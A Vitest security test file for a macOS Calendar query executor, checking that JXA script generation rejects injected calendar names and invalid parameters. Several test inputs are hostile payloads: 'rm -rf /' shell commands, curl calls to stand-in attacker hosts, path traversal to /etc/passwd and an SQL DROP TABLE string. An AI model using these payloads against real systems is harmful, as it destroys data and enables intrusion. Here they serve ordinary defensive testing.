/**
 * Security tests for query executor
 * Tests JXA injection prevention and input validation
 */

import { describe, it, expect, beforeEach } from 'vitest';
import { QueryExecutor } from '../../src/query-executor/query-executor.js';
import { sanitizeCalendarName } from '../../src/query-executor/jxa-generator.js';
import { QueryParams } from '../../src/query-executor/types.js';

describe('Security - JXA Injection Prevention', () => {
  let executor: QueryExecutor;

  beforeEach(() => {
    executor = new QueryExecutor();
  });

  describe('sanitizeCalendarName', () => {
    it('should accept valid calendar names with alphanumeric characters', () => {
      expect(() => sanitizeCalendarName('MyCalendar123')).not.toThrow();
    });

    it('should accept calendar names with spaces', () => {
      expect(() => sanitizeCalendarName('My Calendar')).not.toThrow();
    });

    it('should accept calendar names with hyphens', () => {
      expect(() => sanitizeCalendarName('Work-Calendar')).not.toThrow();
    });

    it('should accept calendar names with apostrophes', () => {
      expect(() => sanitizeCalendarName("John's Calendar")).not.toThrow();
    });

    it('should accept calendar names with underscores', () => {
      expect(() => sanitizeCalendarName('my_calendar')).not.toThrow();
    });

    it('should reject calendar names with semicolons (command injection)', () => {
      expect(() => sanitizeCalendarName('"; do shell script "rm -rf /"; "')).toThrow(/Invalid characters/);
    });

    it('should reject calendar names with double quotes', () => {
      expect(() => sanitizeCalendarName('Cal"endar')).toThrow(/Invalid characters/);
    });

    it('should reject calendar names with backslashes', () => {
      expect(() => sanitizeCalendarName('Cal\\endar')).toThrow(/Invalid characters/);
    });

    it('should reject calendar names with backticks', () => {
      expect(() => sanitizeCalendarName('Cal`date`endar')).toThrow(/Invalid characters/);
    });

    it('should reject calendar names with dollar signs', () => {
      expect(() => sanitizeCalendarName('$HOME')).toThrow(/Invalid characters/);
    });

    it('should reject calendar names with actual newline characters', () => {
      // Test with actual newline character (not escaped string)
      const nameWithNewline = 'Cal' + String.fromCharCode(10) + 'endar';
      expect(() => sanitizeCalendarName(nameWithNewline)).toThrow(/Invalid characters/);
    });

    it('should reject calendar names with parentheses', () => {
      expect(() => sanitizeCalendarName('Cal(endar)')).toThrow(/Invalid characters/);
    });

    it('should reject calendar names with angle brackets', () => {
      expect(() => sanitizeCalendarName('Cal<endar>')).toThrow(/Invalid characters/);
    });

    it('should reject calendar names with pipes', () => {
      expect(() => sanitizeCalendarName('Cal|endar')).toThrow(/Invalid characters/);
    });

    it('should reject calendar names with ampersands', () => {
      expect(() => sanitizeCalendarName('Cal&endar')).toThrow(/Invalid characters/);
    });

    it('should reject calendar names exceeding maximum length', () => {
      const longName = 'a'.repeat(101);
      expect(() => sanitizeCalendarName(longName)).toThrow(/too long/);
    });

    it('should accept calendar names at maximum length', () => {
      const maxName = 'a'.repeat(100);
      expect(() => sanitizeCalendarName(maxName)).not.toThrow();
    });
  });

  describe('JXA Script Generation Security', () => {
    it('should generate safe JXA script with sanitized calendar name', () => {
      const params: QueryParams = {
        app: 'Calendar',
        timeRange: 'today',
        calendarName: 'MyCalendar'
      };

      const script = executor.generateJXAScript(params);
      
      // Script should contain sanitized calendar name
      expect(script).toContain('byName("MyCalendar")');
      
      // Script should not contain injection attempts
      expect(script).not.toContain('do shell script');
      expect(script).not.toContain('rm -rf');
    });

    it('should reject JXA generation with malicious calendar name', () => {
      const params: QueryParams = {
        app: 'Calendar',
        timeRange: 'today',
        calendarName: '"); do shell script "rm -rf /"; app.calendars.byName("'
      };

      expect(() => executor.generateJXAScript(params)).toThrow(/Invalid characters/);
    });

    it('should handle complex injection attempts', () => {
      const injectionAttempts = [
        '\\"); app.system.doShellScript("curl malicious.com"); app.calendars.byName("',
        "'; delete app.calendars[0]; '",
        '$(rm -rf /)',
        '`curl http://attacker.com`',
        '../../../etc/passwd'
      ];

      injectionAttempts.forEach(attempt => {
        const params: QueryParams = {
          app: 'Calendar',
          timeRange: 'today',
          calendarName: attempt
        };
        
        expect(() => executor.generateJXAScript(params)).toThrow(/Invalid characters/);
      });
    });
  });

  describe('Input Validation - timeRange', () => {
    it('should reject invalid timeRange values', () => {
      const params = {
        app: 'Calendar',
        timeRange: 'invalid_range' as any
      };

      return expect(executor.executeQuery(params)).rejects.toThrow(/Invalid timeRange/);
    });

    it('should reject timeRange with SQL injection attempt', () => {
      const params = {
        app: 'Calendar',
        timeRange: "today'; DROP TABLE events; --" as any
      };

      return expect(executor.executeQuery(params)).rejects.toThrow(/Invalid timeRange/);
    });

    it('should reject empty timeRange', () => {
      const params = {
        app: 'Calendar',
        timeRange: '' as any
      };

      return expect(executor.executeQuery(params)).rejects.toThrow(/Invalid timeRange/);
    });

    it('should reject null timeRange', () => {
      const params = {
        app: 'Calendar',
        timeRange: null as any
      };

      return expect(executor.executeQuery(params)).rejects.toThrow(/Invalid timeRange/);
    });
  });

  describe('Input Validation - app parameter', () => {
    it('should reject empty app parameter', () => {
      const params = {
        app: '',
        timeRange: 'today' as const
      };

      return expect(executor.executeQuery(params)).rejects.toThrow(/App parameter must be a non-empty string/);
    });

    it('should reject whitespace-only app parameter', () => {
      const params = {
        app: '   ',
        timeRange: 'today' as const
      };

      return expect(executor.executeQuery(params)).rejects.toThrow(/App parameter must be a non-empty string/);
    });

    it('should reject null app parameter', () => {
      const params = {
        app: null as any,
        timeRange: 'today' as const
      };

      return expect(executor.executeQuery(params)).rejects.toThrow(/App parameter must be a non-empty string/);
    });

    it('should reject undefined app parameter', () => {
      const params = {
        app: undefined as any,
        timeRange: 'today' as const
      };

      return expect(executor.executeQuery(params)).rejects.toThrow(/App parameter must be a non-empty string/);
    });
  });

  describe('Input Validation - calendarName parameter', () => {
    it('should reject non-string calendarName', () => {
      const params = {
        app: 'Calendar',
        timeRange: 'today' as const,
        calendarName: 123 as any
      };

      return expect(executor.executeQuery(params)).rejects.toThrow(/Calendar name must be a string/);
    });

    it('should reject calendarName exceeding length limit', () => {
      const params: QueryParams = {
        app: 'Calendar',
        timeRange: 'today',
        calendarName: 'a'.repeat(101)
      };

      return expect(executor.executeQuery(params)).rejects.toThrow(/too long/);
    });
  });

  describe('Error Handling - JSON Parsing', () => {
    it('should handle malformed JSON responses', async () => {
      const executor = new QueryExecutor();
      
      // Mock executeJXA to return malformed JSON
      executor.executeJXA = async () => 'not valid json {';

      const params: QueryParams = {
        app: 'Calendar',
        timeRange: 'today'
      };

      await expect(executor.executeQuery(params)).rejects.toThrow(/Failed to parse Calendar.app response as JSON/);
    });

    it('should handle empty JSON responses', async () => {
      const executor = new QueryExecutor();
      
      // Mock executeJXA to return empty string
      executor.executeJXA = async () => '';

      const params: QueryParams = {
        app: 'Calendar',
        timeRange: 'today'
      };

      await expect(executor.executeQuery(params)).rejects.toThrow(/Failed to parse Calendar.app response as JSON/);
    });

    it('should handle non-array JSON responses', async () => {
      const executor = new QueryExecutor();
      
      // Mock executeJXA to return object instead of array
      executor.executeJXA = async () => '{"error": "something"}';

      const params: QueryParams = {
        app: 'Calendar',
        timeRange: 'today'
      };

      await expect(executor.executeQuery(params)).rejects.toThrow(/Expected array of calendar events/);
    });

    it('should accept valid array JSON responses', async () => {
      const executor = new QueryExecutor();
      
      // Mock executeJXA to return valid array
      executor.executeJXA = async () => '[]';

      const params: QueryParams = {
        app: 'Calendar',
        timeRange: 'today'
      };

      const result = await executor.executeQuery(params);
      expect(result).toEqual([]);
    });
  });

  describe('Error Handling - Timeout', () => {
    it('should handle timeout errors appropriately', async () => {
      const executor = new QueryExecutor();
      
      // Mock executeJXA to simulate timeout
      executor.executeJXA = async () => {
        const error: any = new Error('JXA execution timeout (exceeded 30 seconds)');
        error.killed = true;
        error.signal = 'SIGTERM';
        throw error;
      };

      const params: QueryParams = {
        app: 'Calendar',
        timeRange: 'today'
      };

      await expect(executor.executeQuery(params)).rejects.toThrow(/timeout/i);
    });
  });
});
